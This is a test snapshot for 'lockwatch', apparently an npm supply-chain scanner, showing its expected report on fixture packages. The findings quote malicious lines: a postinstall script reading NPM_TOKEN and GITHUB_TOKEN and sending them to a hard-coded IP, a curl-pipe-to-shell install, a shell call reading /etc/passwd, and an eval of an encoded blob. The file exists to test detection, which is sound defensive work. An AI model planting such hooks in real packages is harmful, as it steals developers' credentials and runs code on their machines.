@@ -1,0 +1,99 @@
+---
+source: crates/lockwatch-cli/tests/fixtures.rs
+expression: stable
+---
+lockwatch 0.1.0: 12 packages from mixed.json scanned in [duration]
+
+PACKAGE                     LEVEL     SCORE  RULES
+lwfx-steal-env-token@1.0.0  critical    100  LW001, LW004, LW005
+lwfx-tampered@1.0.0         high         60  LW012
+lwfx-cp-in-helper@1.0.0     medium       33  LW001, LW003
+lwfx-curl-pipe-sh@1.0.0     medium       33  LW001, LW002
+lwfx-obf-entropy@1.0.0      low          24  LW006, LW007
+expresss@1.0.0              low          12  LW008
+lwfx-new-maintainer@1.0.0   low          12  LW010
+lwfx-fresh-release@1.0.0    none          3  LW009
+lwfx-hidden-elf@1.0.0       none          3  LW011
+lwfx-ok-node-gyp@1.0.0      none          0  LW001
+(2 packages with no findings not shown)
+
+Findings
+
+  lwfx-steal-env-token@1.0.0 (critical, score 100)
+    [low] LW001 package.json:5
+        "postinstall": "node i.js"
+        The package runs a postinstall script automatically when it is installed.
+    [high] LW004 i.js:1
+        const https = require('https');
+        Install-time code uses the network (https).
+    [high] LW004 i.js:6
+        const req = https.request({ host: '203.0.113.22', port: 443, method: 'POST' });
+        Install-time code makes a network request (https) and contains a hard-coded IP address (203.0.113.22).
+    [critical] LW005 i.js:3
+        npm: process.env.NPM_TOKEN,
+        Reads the secret-looking environment variable NPM_TOKEN. The same install-time file uses the network, which is how stolen secrets are sent out.
+    [critical] LW005 i.js:4
+        gh: process.env['GITHUB_TOKEN'],
+        Reads the secret-looking environment variable GITHUB_TOKEN. The same install-time file uses the network, which is how stolen secrets are sent out.
+
+  lwfx-tampered@1.0.0 (high, score 60)
+    [critical] LW012
+        expected sha512-Abxy609GkQ09qLAK8ldwOzsRO… got sha512-kUiIlgfToBSw3mnsftE3P1b+5…
+        The tarball does not match the integrity hash in the lockfile, so it may have been tampered with.
+
+  lwfx-cp-in-helper@1.0.0 (medium, score 33)
+    [low] LW001 package.json:5
+        "postinstall": "node install.js"
+        The package runs a postinstall script automatically when it is installed.
+    [high] LW003 lib/util.js:3
+        childProcess.execFile('/bin/sh', ['-c', 'cat /etc/passwd'], () => {});
+        Install-time code calls child_process.execFile, which can run any program on the machine.
+
+  lwfx-curl-pipe-sh@1.0.0 (medium, score 33)
+    [low] LW001 package.json:6
+        "postinstall": "curl -fsSL https://example.invalid/install.sh | sh"
+        The package runs a postinstall script automatically when it is installed.
+    [high] LW002 package.json:6
+        curl -fsSL https://example.invalid/install.sh | sh
+        The postinstall script downloads a script with curl/wget and pipes it into a shell.
+
+  lwfx-obf-entropy@1.0.0 (low, score 24)
+    [medium] LW006 index.js:7
+        if (process.env.LWFX_NEVER) eval(decode(blob));
+        Runs code that is built at runtime (eval).
+    [medium] LW007 index.js:2
+        const blob = 'fVh+VkcOClt6CbADtN3Dq1g38qiah9sgeOkGADr54/w9JjFe5c+2dJxKBCNB/GqxWcW7M0042VuCG7ApsHMR/N55V1ddSVF23zjOuDgMHoo6B56APmfe8i1a2/FN+khDj1LN/TekZr9da5e650MZEp5YehM1xO/inVCFg+6ivMO4j0Ww+S6adBj…
+        A 3000-character string literal has 5.98 bits/char of entropy, typical of an encoded or encrypted payload.
+
+  expresss@1.0.0 (low, score 12)
+    [medium] LW008
+        "expresss" is 1 edit away from "express" (143244952 weekly downloads)
+        The name looks like a misspelling of the popular package express.
+
+  lwfx-new-maintainer@1.0.0 (low, score 12)
+    [medium] LW010
+        1.0.0 published by mallory; previous 5 versions published by alice, bob
+        mallory did not publish any of the previous 5 versions, which can mean an account takeover or a new maintainer.
+
+  lwfx-fresh-release@1.0.0 (none, score 3)
+    [low] LW009
+        lwfx-fresh-release@1.0.0 published 2026-10-18T09:30:00Z
+        This version was published 1 day before the scan, so it has had little public scrutiny.
+
+  lwfx-hidden-elf@1.0.0 (none, score 3)
+    [low] LW011 bin/.cache/update
+        bin/.cache/update (ELF executable, 123 bytes)
+        The package ships an ELF executable but its package.json declares no native build.
+
+  lwfx-ok-node-gyp@1.0.0 (none, score 0)
+    [info] LW001 package.json:7
+        "install": "node-gyp rebuild"
+        The install script only runs a native build tool (node-gyp).
+
+Skipped (4)
+  file-dep@1.0.0: file: dependency
+  git-dep@1.0.0: git dependency (not supported in v1)
+  local-lib: link: dependency (local folder)
+  local-lib@0.1.0: workspace package (local folder)
+
+Findings: critical 3 | high 4 | medium 4 | low 5 | info 1
